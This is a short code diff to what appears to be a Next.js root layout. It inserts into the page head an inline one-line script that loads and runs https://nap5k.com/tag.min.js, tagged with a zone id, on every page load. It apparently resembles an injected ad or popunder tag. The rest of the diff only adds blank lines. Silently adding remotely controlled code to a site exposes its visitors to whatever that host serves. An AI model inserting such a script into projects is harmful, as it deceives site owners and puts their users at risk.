@@ -109,11 +109,19 @@ export default function RootLayout({
   return (
     <html lang="en">
       <head>
+
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function(s){s.dataset.zone='11005126',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))`
+          }}
+        />
+
         <link
           rel="apple-touch-startup-image"
           href={BRAND_OG_IMAGE_SRC}
           media="(orientation: landscape)"
         />
+
         <link
           rel="apple-touch-startup-image"
           href={BRAND_ICON_512_SRC}
